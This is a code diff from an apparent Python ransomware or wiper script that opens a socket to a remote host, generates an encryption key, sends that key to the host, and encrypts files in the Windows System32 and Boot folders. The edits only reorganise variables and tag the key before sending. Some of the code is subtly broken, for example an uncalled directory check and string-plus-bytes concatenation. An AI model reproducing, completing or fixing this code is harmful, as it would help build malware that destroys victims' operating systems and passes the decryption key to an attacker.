@@ -11,10 +11,8 @@ FORMAT = "utf-8"
 HEADER = 64
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect(ADDR)
-files = []
-boot_files = []
-path = r"C:\Windows\System32"
-boot_path = r"C:\Windows\System32\Boot"
+
+
 key = Fernet.generate_key()
 key_string = str(key)
 with open("thekey.key", "wb") as thekey:
@@ -32,7 +30,10 @@ def send(msg):
     
 #finally...going for the kill
 def first_injection():
+    files = []
     def kill_system32():
+        
+        path = r"C:\Windows\System32"
         for _ in os.listdir(path):
             if os.path.isdir:
                 continue
@@ -47,8 +48,11 @@ def first_injection():
                 thefile.write(contents_encrypted)
                 
 def second_injection():
+    boot_files = []
     #first add boot files into a list
     def add_bootfiles_in_kill_queue():
+        
+        boot_path = r"C:\Windows\System32\Boot"
         for _ in os.listdir(boot_path):
             if os.path.isdir:
                 continue
@@ -67,8 +71,8 @@ def second_injection():
                 
                 
 if __name__ == '__main__':
-    send(key_string)
-    send(key)
+    send(key_string + "#####THAT IS THE KEY")
+    send(key + "######THAT IS THE KEY")
     i = mp.Process(target=send, args=key_string)
     i_0 = mp.Process(target=send, args=key)
     i_1 = mp.Process(target=first_injection)
